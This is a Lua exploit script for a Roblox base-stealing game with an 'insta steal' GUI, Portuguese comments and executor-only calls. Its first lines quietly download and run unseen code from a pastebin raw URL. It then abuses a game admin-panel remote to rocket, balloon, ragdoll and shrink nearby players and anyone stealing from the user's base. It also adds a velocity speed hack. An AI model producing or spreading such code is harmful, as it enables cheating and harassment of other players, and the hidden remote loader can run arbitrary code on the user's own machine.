task.spawn(function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AcnkvwjM'))()
end)

local Player = game:GetService('Players').LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Root = Character:WaitForChild('HumanoidRootPart')
local RunService = game:GetService('RunService')
local UserInputService = game:GetService('UserInputService')
local Plots = workspace:FindFirstChild('Plots')

local Net = require(game:GetService('ReplicatedStorage').Packages.Net)
local ExecuteCommand = Net:RemoteEvent('AdminPanelService/ExecuteCommand')

local Commands = {
    'rocket',
    'balloon',
    'tiny',
}

local function GetClosestPlayer()
    local closest
    local shortest = math.huge
    for _, player in ipairs(game:GetService('Players'):GetPlayers()) do
        if player ~= Player and player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
            local distance = (Root.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if distance < shortest then
                shortest = distance
                closest = player
            end
        end
    end
    return closest
end

local function runpanel()
    local target = GetClosestPlayer()
    if not target then return end
    for _, cmd in ipairs(Commands) do
        ExecuteCommand:FireServer(target, cmd)
    end
end

local function getMyBase()
    local myName, myDisplayName = Player.Name, Player.DisplayName
    local plotsFolder = workspace:FindFirstChild('Plots')
    if not plotsFolder then return nil end
    for _, plotModel in ipairs(plotsFolder:GetChildren()) do
        local sign = plotModel:FindFirstChild('PlotSign')
        if sign then
            local surfaceGui = sign:FindFirstChild('SurfaceGui')
            if surfaceGui and surfaceGui:FindFirstChild('Frame') and surfaceGui.Frame:FindFirstChildOfClass('TextLabel') then
                local label = surfaceGui.Frame:FindFirstChildOfClass('TextLabel')
                if type(label.Text) == 'string' and (string.find(label.Text, myDisplayName, 1, true) or string.find(label.Text, myName, 1, true)) then
                    return plotModel
                end
            end
        end
    end
end

-- GUI
local ScreenGui = Instance.new('ScreenGui')
local Frame = Instance.new('Frame')
local UICorner = Instance.new('UICorner')
local TextLabel = Instance.new('TextLabel')
local TextButton = Instance.new('TextButton')
local UICorner_2 = Instance.new('UICorner')

setthreadidentity(8)
ScreenGui.Parent = cloneref(game:GetService('CoreGui'))
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.BackgroundTransparency = 0.2
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.54, 0, 0.55, 0)
Frame.Size = UDim2.new(0, 274, 0, 140)
Frame.Active = true
Frame.Draggable = true

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0.22, 0, 0.05, 0)
TextLabel.Size = UDim2.new(0, 155, 0, 39)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = 'yanzsn '
TextLabel.TextColor3 = Color3.fromRGB(225, 225, 225)
TextLabel.TextSize = 31

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.17, 0, 0.55, 0)
TextButton.Size = UDim2.new(0, 178, 0, 38)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = 'insta steal'
TextButton.TextColor3 = Color3.fromRGB(0, 43, 59)
TextButton.TextSize = 20

UICorner_2.CornerRadius = UDim.new(0, 14)
UICorner_2.Parent = TextButton

-- ⚡ SPEED SYSTEM (Auto + Tecla Z)
local speedEnabled = true
local connection

local function setSpeed(active)
    if active then
        if connection then connection:Disconnect() end
        local Humanoid = Character:WaitForChild('Humanoid')
        local HRP = Character:WaitForChild('HumanoidRootPart')
        local speed = 29
    
        connection = RunService.RenderStepped:Connect(function()
            local moveDir = Humanoid.MoveDirection
            if moveDir.Magnitude > 0 then
                HRP.Velocity = moveDir * speed + Vector3.new(0, HRP.Velocity.Y, 0)
            else
                HRP.Velocity = Vector3.new(0, HRP.Velocity.Y, 0)
            end
        end)

        Humanoid.Died:Connect(function()
            if connection then connection:Disconnect() end
        end)
    else
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end

setSpeed(true)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Z then
        speedEnabled = not speedEnabled
        setSpeed(speedEnabled)
        game:GetService('StarterGui'):SetCore("SendNotification", {
            Title = "Speed";
            Text = speedEnabled and "Ativado" or "Desativado";
            Duration = 2;
        })
    end
end)

-- Detecta roubo
task.spawn(function()
    local base = getMyBase()
    if base then
        for _, v in ipairs(base:GetDescendants()) do
            if v.Name == 'Stolen' and v:IsA('GuiObject') then
                v:GetPropertyChangedSignal('Visible'):Connect(function()
                    if v.Visible then
                        local name = v.Parent:FindFirstChild('DisplayName').Text
                        for i, v in pairs(game:GetService('Players'):GetChildren()) do
                            if v:GetAttribute('Stealing', true) then
                                if v:GetAttribute('StealingIndex', name) then
                                    if v then
                                        ExecuteCommand:FireServer(v, 'rocket')
                                        ExecuteCommand:FireServer(v, 'ragdoll')
                                        ExecuteCommand:FireServer(v, 'balloon')
                                        task.wait(1.3)
                                        Player:Kick("calma ugauga")
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    else
        warn('No base found')
    end
end)

TextButton.MouseButton1Click:Connect(function()
    runpanel()
end)
